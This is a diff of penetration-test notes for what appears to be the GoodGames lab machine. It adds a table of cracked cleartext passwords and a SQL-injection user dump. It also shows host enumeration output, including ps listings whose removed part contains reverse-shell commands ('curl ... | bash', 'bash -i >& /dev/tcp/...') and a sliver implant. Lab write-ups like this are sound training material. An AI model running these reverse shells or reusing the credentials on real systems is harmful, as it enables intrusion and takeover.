@@ -11,6 +11,16 @@ _current DB user_: 'main_admin@localhost'
 
 _current DB user is DBA_: False
 
+### Passwords
++------------------------+---------------------------+----------------------+
+| login                  | password                  | where                |
++------------------------+---------------------------+----------------------+
+| admin@goodgames.htb    | superadministrator        | web portal (gg)      |
+| admin                  | superadministrator        | web portal (int-adm) |
+| augustus               | superadministrator        | ssh (docker -> host) |
+| main_admin             | C4n7_Cr4cK_7H1S_pasSw0Rd! | mysql (host)         |
++------------------------+---------------------------+----------------------+
+
 ## To-Do
 ### Enumeration
 [_] Continue enumeration of linux host
@@ -72,11 +82,11 @@ back-end DBMS: MySQL >= 5.0.12
 ```
 Database: main
 Table: user
-+----+----------+---------------------+----------------------------------+--------------------+
-| id | name     | email               | password                         | password           |
-+----+----------+---------------------+----------------------------------+--------------------+
-| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
-+----+----------+---------------------+----------------------------------+--------------------+
++----+------------+---------------------+----------------------------------+--------------------+
+| id | name       | email               | hash                             | password           |
++----+------------+---------------------+----------------------------------+--------------------+
+| 1  | admin      | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
++----+------------+---------------------+----------------------------------+--------------------+
 ```
 #### Password Re-use
 - Host: http://internal-administration.goodgames.htb
@@ -1401,146 +1411,336 @@ sliver (REAL_DYNAMO) > shell
 [*] Started remote shell with pid 5578
 ```
 
-The first piece of information we will need to enumerate is the operating system's information.
-```
-augustus@GoodGames:~$ cat /etc/*-release
-PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
-NAME="Debian GNU/Linux"
-VERSION_ID="11"
-VERSION="11 (bullseye)"
-VERSION_CODENAME=bullseye
-ID=debian
-HOME_URL="https://www.debian.org/"
-SUPPORT_URL="https://www.debian.org/support"
-BUG_REPORT_URL="https://bugs.debian.org/"
-```
+## System Enumeration
 
-We will also need the kernel version and operating system architecture. Useful in determining vulnerabilities and finding kernel exploits.
-```
-augustus@GoodGames:~$ uname -a
+> uname -a
+'''
 Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
+'''
+
+> cat /proc/version
+```
+Linux version 4.19.0-18-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.208-1 (2021-09-29)
 ```
 
-Let's see what is running as root; bearing in mind that a lot of these may be from previous work/connections
+> cat /etc/issue
 ```
-augustus@GoodGames:~$ ps aux | grep root
-root         8  0.0  0.0      0     0 ?        I<   13:51   0:00 [mm_percpu_wq]
-root        12  0.0  0.0      0     0 ?        S    13:51   0:00 [migration/0]
-root        15  0.0  0.0      0     0 ?        S    13:51   0:00 [cpuhp/1]
-root        16  0.0  0.0      0     0 ?        S    13:51   0:00 [migration/1]
-root        27  0.0  0.0      0     0 ?        SN   13:51   0:00 [ksmd]
-root        28  0.0  0.0      0     0 ?        SN   13:51   0:00 [khugepaged]
-root        29  0.0  0.0      0     0 ?        I<   13:51   0:00 [crypto]
-root        30  0.0  0.0      0     0 ?        I<   13:51   0:00 [kintegrityd]
-root        34  0.0  0.0      0     0 ?        S    13:51   0:00 [watchdogd]
-root        36  0.0  0.0      0     0 ?        S    13:51   0:00 [kswapd0]
-root        55  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/24-pciehp]
-root        56  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/25-pciehp]
-root        59  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/28-pciehp]
-root        60  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/29-pciehp]
-root        63  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/32-pciehp]
-root        66  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/35-pciehp]
-root        70  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/39-pciehp]
-root        71  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/40-pciehp]
-root        74  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/43-pciehp]
-root        75  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/44-pciehp]
-root        76  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/45-pciehp]
-root        78  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/47-pciehp]
-root        79  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/48-pciehp]
-root        81  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/50-pciehp]
-root        82  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/51-pciehp]
-root        83  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/52-pciehp]
-root        84  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/53-pciehp]
-root        85  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/54-pciehp]
-root        86  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/55-pciehp]
-root        87  0.0  0.0      0     0 ?        I<   13:51   0:00 [ipv6_addrconf]
-root        97  0.0  0.0      0     0 ?        I<   13:51   0:00 [kstrp]
-root       144  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_0]
-root       146  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_0]
-root       147  0.0  0.0      0     0 ?        I<   13:51   0:00 [vmw_pvscsi_wq_0]
-root       151  0.0  0.0      0     0 ?        I<   13:51   0:00 [ata_sff]
-root       153  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_1]
-root       155  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_1]
-root       157  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_2]
-root       159  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_2]
-root       160  0.0  0.0      0     0 ?        I    13:51   0:00 [kworker/u4:2-events_unbound]
-root       202  0.0  0.0      0     0 ?        I<   13:51   0:00 [kworker/0:1H-kblockd]
-root       222  0.0  0.0      0     0 ?        I    13:51   0:01 [kworker/0:2-events]
-root       278  0.0  0.0      0     0 ?        I<   13:51   0:00 [kworker/1:1H-kblockd]
-root       421  0.0  0.0      0     0 ?        S    13:52   0:00 [jbd2/sda1-8]
-root       422  0.0  0.0      0     0 ?        I<   13:52   0:00 [ext4-rsv-conver]
-root       452  0.0  0.2  22268  8232 ?        Ss   13:52   0:00 /lib/systemd/systemd-journald
-root       471  0.0  0.1  21160  4928 ?        Ss   13:52   0:00 /lib/systemd/systemd-udevd
-root       510  0.0  0.2  47816 10548 ?        Ss   13:52   0:00 /usr/bin/VGAuthService
-root       511  0.0  0.1 236988  8032 ?        Ssl  13:52   0:25 /usr/bin/vmtoolsd
-root       571  0.0  0.0      0     0 ?        I<   13:52   0:00 [ttm_swap]
-root       572  0.0  0.0      0     0 ?        S    13:52   0:00 [irq/16-vmwgfx]
-root       577  0.0  0.0      0     0 ?        I<   13:52   0:00 [nfit]
-root       590  0.0  0.0   6680  2896 ?        Ss   13:52   0:00 /usr/sbin/cron -f
-root       591  0.0  0.1 219760  4248 ?        Ssl  13:52   0:00 /usr/sbin/rsyslogd -n -iNONE
-root       592  0.0  0.1  15272  7020 ?        Ss   13:52   0:00 /lib/systemd/systemd-logind
-root       725  0.0  0.5 195416 20892 ?        Ss   13:52   0:01 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
-root       746  0.0  0.0   5780  1684 tty1     Ss+  13:52   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
-root       749  0.1  1.1 1344724 47672 ?       Ssl  13:52   0:29 /usr/bin/containerd
-root       847  0.0  0.1  15324  6700 ?        Ss   13:52   0:00 /usr/sbin/apache2 -k start
-root       934  0.0  2.0 1457432 82132 ?       Ssl  13:52   0:07 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
-root      1023  0.0  1.4 639804 57624 ?        Ssl  13:52   0:02 PM2 v5.1.2: God Daemon (/root/.pm2) 
-root      1272  0.0  0.2 1148904 11568 ?       Sl   13:52   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
-root      1285  0.0  0.3 711700 12296 ?        Sl   13:52   0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f -address /run/containerd/containerd.sock
-root      1305  0.0  1.3 392556 55720 ?        Ssl  13:52   0:07 python3 project/run.py
-root      1393  0.0  0.1  12328  7256 ?        Ss   13:52   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
-root      1716  0.0  0.0   4292   780 ?        S    14:47   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
-root      1718  0.0  0.0  19708  3016 ?        S    14:47   0:00 bash
-root      1719  0.0  0.0  19708  3180 ?        S    14:47   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
-root      1720  0.0  0.0  19940  3656 ?        S    14:47   0:00 bash -i
-root      1925  0.0  0.2  36120  8504 ?        S    16:39   0:00 python -c import pty;pty.spawn("/bin/bash")
-root      1926  0.0  0.0  20144  3788 pts/0    Ss   16:39   0:00 /bin/bash
-root      1954  0.0  0.0  12864  1004 pts/0    S+   16:52   0:00 grep /root/scan.txt
-root      1955  0.0  0.0  12864   932 pts/0    S+   16:52   0:00 grep open
-root      1957  0.0  0.0   4292   712 ?        S    16:52   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
-root      1959  0.0  0.0  19708  3172 ?        S    16:52   0:00 bash
-root      1960  0.0  0.0  19708  3196 ?        S    16:52   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
-root      1961  0.0  0.0  19940  3576 ?        S    16:52   0:00 bash -i
-root      1962  0.0  0.1  35732  8072 ?        S    16:53   0:00 python -c import pty;pty.spawn("/bin/bash")
-root      1963  0.0  0.0  19956  3600 pts/1    Ss   16:53   0:00 /bin/bash
-root      1968  0.0  0.1  45188  5288 pts/1    S+   16:54   0:00 ssh augustus@172.19.0.1
-root      1969  0.0  0.2  13080  8248 ?        Ss   16:54   0:00 sshd: augustus [priv]
-root      2086  0.0  0.0      0     0 ?        I    17:39   0:07 [kworker/1:0-mm_percpu_wq]
-root      2228  0.0  0.0      0     0 ?        Z    19:08   0:00 [ssh] <defunct>
-root      2297  0.0  0.0      0     0 ?        Z    19:13   0:00 [ssh] <defunct>
-root      2314  0.0  0.0   4292   796 ?        S    19:18   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
-root      2316  0.0  0.0  19708  3152 ?        S    19:18   0:00 bash
-root      2317  0.0  0.0  19708  3180 ?        S    19:18   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
-root      2318  0.0  0.0  19940  3588 ?        S    19:18   0:00 bash -i
-root      2320  0.0  0.1  35732  7960 ?        S    19:18   0:00 python -c import pty;pty.spawn("/bin/bash")
-root      2321  0.0  0.0  19956  3616 pts/2    Ss   19:18   0:00 /bin/bash
-root      2324  0.0  0.1  45188  5324 pts/2    S+   19:19   0:00 ssh augustus@172.19.0.1
-root      2325  0.0  0.2  13084  8320 ?        Ss   19:19   0:00 sshd: augustus [priv]
-root      2347  0.0  0.0      0     0 ?        I    19:26   0:00 [kworker/u4:0-events_unbound]
-root      5577  0.0  0.0      0     0 ?        I    20:44   0:00 [kworker/1:1]
-root      5629  0.0  0.0      0     0 ?        I    21:09   0:00 [kworker/0:1-cgroup_destroy]
-augustus  5639  0.0  0.0   6176   648 pts/3    S+   21:23   0:00 grep root
+Debian GNU/Linux 11 \n \l
 ```
 
-SUID Binarys
+> lscpu
 ```
-augustus@GoodGames:~$ find / -perm -u=s -type f 2>/dev/null
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/fusermount
-/usr/bin/umount
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/mount
-/usr/bin/su
+Architecture:                    x86_64
+CPU op-mode(s):                  32-bit, 64-bit
+Byte Order:                      Little Endian
+Address sizes:                   43 bits physical, 48 bits virtual
+CPU(s):                          2
+On-line CPU(s) list:             0,1
+Thread(s) per core:              1
+Core(s) per socket:              1
+Socket(s):                       2
+NUMA node(s):                    1
+Vendor ID:                       GenuineIntel
+CPU family:                      6
+Model:                           85
+Model name:                      Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz
+Stepping:                        7
+CPU MHz:                         2294.609
+BogoMIPS:                        4589.21
+Hypervisor vendor:               VMware
+Virtualization type:             full
+L1d cache:                       64 KiB
+L1i cache:                       64 KiB
+L2 cache:                        2 MiB
+L3 cache:                        44 MiB
+NUMA node0 CPU(s):               0,1
+Vulnerability Itlb multihit:     KVM: Vulnerable
+Vulnerability L1tf:              Not affected
+Vulnerability Mds:               Not affected
+Vulnerability Meltdown:          Not affected
+Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled v
+                                 ia prctl and seccomp
+Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user
+                                  pointer sanitization
+Vulnerability Spectre v2:        Mitigation; Enhanced IBRS, IBPB conditional, RS
+                                 B filling
+Vulnerability Srbds:             Not affected
+Vulnerability Tsx async abort:   Not affected
+Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtr
+                                 r pge mca cmov pat pse36 clflush mmx fxsr sse s
+                                 se2 ss syscall nx pdpe1gb rdtscp lm constant_ts
+                                 c arch_perfmon nopl xtopology tsc_reliable nons
+                                 top_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid
+                                  sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline
+                                 _timer aes xsave avx f16c rdrand hypervisor lah
+                                 f_lm abm 3dnowprefetch cpuid_fault invpcid_sing
+                                 le ssbd ibrs ibpb stibp ibrs_enhanced fsgsbase 
+                                 tsc_adjust bmi1 avx2 smep bmi2 invpcid avx512f 
+                                 avx512dq rdseed adx smap clflushopt clwb avx512
+                                 cd avx512bw avx512vl xsaveopt xsavec xsaves ara
+                                 t pku ospke md_clear flush_l1d arch_capabilitie
+                                 s
 ```
-Nothing identified via [GTFOBins](https://gtfobins.github.io/)
 
+> ps aux | grep root
+```
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2 165256  9988 ?        Ss   Jan09   0:04 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    Jan09   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        I<   Jan09   0:00 [rcu_gp]
+root         4  0.0  0.0      0     0 ?        I<   Jan09   0:00 [rcu_par_gp]
+root         6  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kworker/0:0H-kblockd]
+root         8  0.0  0.0      0     0 ?        I<   Jan09   0:00 [mm_percpu_wq]
+root         9  0.0  0.0      0     0 ?        S    Jan09   0:00 [ksoftirqd/0]
+root        10  0.0  0.0      0     0 ?        I    Jan09   0:12 [rcu_sched]
+root        11  0.0  0.0      0     0 ?        I    Jan09   0:00 [rcu_bh]
+root        12  0.0  0.0      0     0 ?        S    Jan09   0:00 [migration/0]
+root        14  0.0  0.0      0     0 ?        S    Jan09   0:00 [cpuhp/0]
+root        15  0.0  0.0      0     0 ?        S    Jan09   0:00 [cpuhp/1]
+root        16  0.0  0.0      0     0 ?        S    Jan09   0:00 [migration/1]
+root        17  0.0  0.0      0     0 ?        S    Jan09   0:00 [ksoftirqd/1]
+root        19  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kworker/1:0H-kblockd]
+root        20  0.0  0.0      0     0 ?        S    Jan09   0:00 [kdevtmpfs]
+root        21  0.0  0.0      0     0 ?        I<   Jan09   0:00 [netns]
+root        22  0.0  0.0      0     0 ?        S    Jan09   0:00 [kauditd]
+root        23  0.0  0.0      0     0 ?        S    Jan09   0:00 [khungtaskd]
+root        24  0.0  0.0      0     0 ?        S    Jan09   0:00 [oom_reaper]
+root        25  0.0  0.0      0     0 ?        I<   Jan09   0:00 [writeback]
+root        26  0.0  0.0      0     0 ?        S    Jan09   0:00 [kcompactd0]
+root        27  0.0  0.0      0     0 ?        SN   Jan09   0:00 [ksmd]
+root        28  0.0  0.0      0     0 ?        SN   Jan09   0:00 [khugepaged]
+root        29  0.0  0.0      0     0 ?        I<   Jan09   0:00 [crypto]
+root        30  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kintegrityd]
+root        31  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kblockd]
+root        32  0.0  0.0      0     0 ?        I<   Jan09   0:00 [edac-poller]
+root        33  0.0  0.0      0     0 ?        I<   Jan09   0:00 [devfreq_wq]
+root        34  0.0  0.0      0     0 ?        S    Jan09   0:00 [watchdogd]
+root        36  0.0  0.0      0     0 ?        S    Jan09   0:00 [kswapd0]
+root        54  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kthrotld]
+root        55  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/24-pciehp]
+root        56  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/25-pciehp]
+root        57  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/26-pciehp]
+root        58  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/27-pciehp]
+root        59  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/28-pciehp]
+root        60  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/29-pciehp]
+root        61  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/30-pciehp]
+root        62  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/31-pciehp]
+root        63  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/32-pciehp]
+root        64  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/33-pciehp]
+root        65  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/34-pciehp]
+root        58  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/27-pciehp]
+root        59  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/28-pciehp]
+root        60  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/29-pciehp]
+root        61  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/30-pciehp]
+root        62  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/31-pciehp]
+root        63  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/32-pciehp]
+root        64  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/33-pciehp]
+root        66  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/35-pciehp]
+root        67  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/36-pciehp]
+root        68  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/37-pciehp]
+root        69  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/38-pciehp]
+root        70  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/39-pciehp]
+root        71  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/40-pciehp]
+root        72  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/41-pciehp]
+root        73  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/42-pciehp]
+root        74  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/43-pciehp]
+root        75  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/44-pciehp]
+root        76  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/45-pciehp]
+root        77  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/46-pciehp]
+root        78  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/47-pciehp]
+root        79  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/48-pciehp]
+root        80  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/49-pciehp]
+root        81  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/50-pciehp]
+root        82  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/51-pciehp]
+root        83  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/52-pciehp]
+root        84  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/53-pciehp]
+root        85  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/54-pciehp]
+root        86  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/55-pciehp]
+root        87  0.0  0.0      0     0 ?        I<   Jan09   0:00 [ipv6_addrconf]
+root        97  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kstrp]
+root       143  0.0  0.0      0     0 ?        I<   Jan09   0:00 [ata_sff]
+root       144  0.0  0.0      0     0 ?        S    Jan09   0:00 [scsi_eh_0]
+root       145  0.0  0.0      0     0 ?        S    Jan09   0:00 [scsi_eh_1]
+root       146  0.0  0.0      0     0 ?        I<   Jan09   0:00 [scsi_tmf_1]
+root       147  0.0  0.0      0     0 ?        S    Jan09   0:00 [scsi_eh_2]
+root       148  0.0  0.0      0     0 ?        I<   Jan09   0:00 [scsi_tmf_2]
+root       151  0.0  0.0      0     0 ?        I<   Jan09   0:00 [scsi_tmf_0]
+root       152  0.0  0.0      0     0 ?        I<   Jan09   0:00 [vmw_pvscsi_wq_0]
+root       184  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kworker/1:1H-kblockd]
+root       241  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kworker/0:1H-kblockd]
+root       414  0.0  0.0      0     0 ?        I<   Jan09   0:00 [kworker/u5:0]
+root       419  0.0  0.0      0     0 ?        S    Jan09   0:00 [jbd2/sda1-8]
+root       420  0.0  0.0      0     0 ?        I<   Jan09   0:00 [ext4-rsv-conver]
+root       453  0.0  0.2  22308  8260 ?        Ss   Jan09   0:00 /lib/systemd/systemd-journald
+root       469  0.0  0.1  21292  5256 ?        Ss   Jan09   0:00 /lib/systemd/systemd-udevd
+root       508  0.0  0.2  47816 10704 ?        Ss   Jan09   0:00 /usr/bin/VGAuthService
+systemd+   509  0.0  0.1  88836  6008 ?        Ssl  Jan09   0:02 /lib/systemd/systemd-timesyncd
+root       510  0.0  0.1 236980  8052 ?        Ssl  Jan09   0:45 /usr/bin/vmtoolsd
+root       574  0.0  0.0      0     0 ?        I<   Jan09   0:00 [nfit]
+root       575  0.0  0.0      0     0 ?        I<   Jan09   0:00 [ttm_swap]
+root       576  0.0  0.0      0     0 ?        S    Jan09   0:00 [irq/16-vmwgfx]root       586  0.0  0.0   6680  2840 ?        Ss   Jan09   0:00 /usr/sbin/cron -f
+message+   587  0.0  0.1   7256  4424 ?        Ss   Jan09   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root       588  0.0  0.1 219760  4456 ?        Ssl  Jan09   0:00 /usr/sbin/rsyslogd -n -iNONE
+root       589  0.0  0.1  15272  7220 ?        Ss   Jan09   0:00 /lib/systemd/systemd-logind
+root       705  0.0  0.5 195416 20748 ?        Ss   Jan09   0:02 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
+root       710  0.0  1.1 1344724 46092 ?       Ssl  Jan09   0:46 /usr/bin/containerd
+root       712  0.0  0.0   5780  1660 tty1     Ss+  Jan09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+ww         787  0.0  0.2 195700  8512 ?        S    Jan09   0:00 php-fpm: pool w--More--
+www-data   788  0.0  0.2 195700  8512 ?        S    Jan09   0:00 php-fpm: pool www
+root       807  0.0  0.2  15332  8244 ?        Ss   Jan09   0:01 /usr/sbin/apache2 -k start
+mysql      827  0.1 10.2 1740804 413472 ?      Ssl  Jan09   1:23 /usr/sbin/mysqld
+root       862  0.0  2.1 1457176 85540 ?       Ssl  Jan09   0:13 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1068  0.0  1.4 637244 58356 ?        Ssl  Jan09   0:04 PM2 v5.1.2: God Daemon (/root/.pm2)
+www-data  1275  0.0  1.2 423740 50996 ?        Ss   Jan09   0:10 python3 /var/www/goodgames/goodgames.wsgi
+root      1327  0.0  0.2 1148904 9444 ?        Sl   Jan09   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
+root      1341  0.0  0.3 711444 14300 ?        Sl   Jan09   0:03 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f -address /run/containerd/containerd.sock
+root      1362  0.0  1.3 392044 54868 ?        Ss   Jan09   0:11 python3 project/run.py
+root      1460  0.0  0.1  12328  7004 ?        Ss   Jan09   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root      1967  0.0  0.0      0     0 ?        Z    Jan09   0:00 [sh] <defunct>
+root      1970  0.0  0.0      0     0 ?        Z    Jan09   0:04 [bacon] <defunct>
+root      1975  0.0  0.0      0     0 ?        Zs   Jan09   0:00 [bash] <defunct>
+augustus  1983  0.0  0.2  16932  8928 ?        Ss   Jan09   0:00 /lib/systemd/systemd --user
+augustus  1984  0.0  0.0 168308  2404 ?        S    Jan09   0:00 (sd-pam)
+augustus  2017  0.3  0.6 726224 24788 ?        Sl   Jan09   1:41 ./bacon
+augustus  2075  0.0  0.0      0     0 ?        Z    Jan09   0:00 [wget] <defunct>
+augustus  2076  0.0  0.0      0     0 ?        Zs   Jan09   0:00 [bash] <defunct>
+augustus 11687  0.0  0.0  81028  3412 ?        SLs  Jan09   0:00 /usr/bin/gpg-agent --supervised
+augustus 21567  0.0  0.0      0     0 ?        Zs   Jan09   0:00 [bash] <defunct>
+augustus 21669  0.0  0.1   8608  5360 pts/3    Ss   Jan09   0:00 /bin/bash
+root     21680  0.0  0.0      0     0 ?        I    Jan09   0:00 [kworker/u4:2-events_unbound]
+root     22210  0.0  0.0      0     0 ?        I    Jan09   0:00 [kworker/0:0-events]
+root     22237  0.0  0.0      0     0 ?        I    00:00   0:04 [kworker/1:2-events]
+www-data 22238  0.0  0.1  15656  4248 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
+www-data 22239  0.0  0.4 1223568 16856 ?       Sl   00:00   0:00 /usr/sbin/apache2 -k start
+www-data 22240  0.0  0.3 1223816 14864 ?       Sl   00:00   0:00 /usr/sbin/apache2 -k start
+root     22395  0.0  0.0      0     0 ?        I    00:44   0:00 [kworker/1:1]
+root     22452  0.0  0.0      0     0 ?        I    01:09   0:00 [kworker/0:1-cgroup_destroy]
+root     22885  0.0  0.0      0     0 ?        I    02:01   0:00 [kworker/u4:1-events_unbound]
+augustus 22893  0.0  0.0  10708  3144 pts/3    R+   02:08   0:00 ps aux
+augustus 22894  0.0  0.0   5540   784 pts/3    S+   02:08   0:00 more
+```
 
-Networking Details
+## User Enumeration
+
+> whoami
+'''
+augustus@GoodGames:~$ whoami
+augustus
+'''
+
+> id
+'''
+augustus@GoodGames:~$ id
+uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
+'''
+
+> sudo -l
+```
+augustus@GoodGames:~$ sudo -l
+bash: sudo: command not found
+```
+
+> cat /etc/passwd
+```
+augustus@GoodGames:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+```
+
+> cat /etc/shadow
+```
+augustus@GoodGames:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+```
+
+> cat /etc/group
+```
+augustus@GoodGames:~$ cat /etc/group
+root:x:0:    
+daemon:x:1
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
